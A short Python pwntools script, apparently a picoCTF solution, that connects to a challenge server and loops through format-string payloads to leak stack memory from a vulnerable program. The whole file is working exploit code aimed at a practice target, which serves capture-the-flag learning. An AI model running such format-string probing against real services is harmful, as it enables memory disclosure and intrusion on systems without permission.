from pwn import *

context.log_level = 'critical'
for i in range(30):
	# p = process('./vuln_leak')
	p = remote('saturn.picoctf.net', 50378)
	payload = '%' + str(i) + '$s'
	p.recvuntil(b'>>')

	p.sendline(payload)

	p.recv()
	output = p.recv()

	# print(output)
	if (b'segmentation fault' in output):
		print('segfault, it is')
	else:
		print(i, output)
	p.close()